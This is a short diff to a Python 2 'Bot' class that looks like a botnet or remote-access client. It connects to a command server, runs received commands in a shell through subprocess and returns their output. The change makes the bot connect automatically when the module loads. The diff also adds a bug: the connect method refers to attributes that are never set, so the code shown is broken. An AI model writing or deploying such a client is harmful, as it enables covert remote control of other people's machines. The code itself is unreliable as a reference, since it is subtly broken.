@@ -13,16 +13,18 @@ class Bot:
 	BLOCK_SIZE = 16
 	PADDING = '\0'
 	SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	server = 'localhost'
+	port = 8888
 
 	def __init__(self):
 		self.key = Random.new().read(self.BLOCK_SIZE)
+		self.connect(self.server, self.port)
 
-
-	def connect(self, server, port):
-		self.server = str(server)
-		self.port = port
+	def connect(self, serv, portNum):
+		self.server = str(serv)
+		self.port = portNum
 		try:
-			self.SERVER.connect((self.server, self.port))
+			self.SERVER.connect((self.serv, self.portNum))
 		except:
 			print "[-] Cannot Connect"
 			sys.exit(1)
@@ -77,3 +79,6 @@ class Bot:
 		ps =  subprocess.Popen(cmd, stdout=subprocess.PIPE, \
 			stderr=subprocess.STDOUT, shell=True)
 		return ps.communicate()[0]
+
+
+bot = Bot()
